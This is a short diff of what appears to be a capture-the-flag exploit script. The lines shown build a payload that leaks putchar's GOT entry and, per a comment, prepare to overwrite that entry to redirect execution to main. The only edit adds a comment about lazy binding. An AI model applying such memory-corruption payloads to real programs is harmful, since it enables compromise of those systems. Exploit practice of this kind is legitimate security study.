@@ -35,7 +35,7 @@ def leak(para):
 def main():
     #leak putchar
     payload = backward(base_addr, elf.got["putchar"])
-    payload += "."
+    payload += "."#lazy binding
     payload += leak("putchar")
     payload += backward(0, 4)
     #hijack putchar_got to main
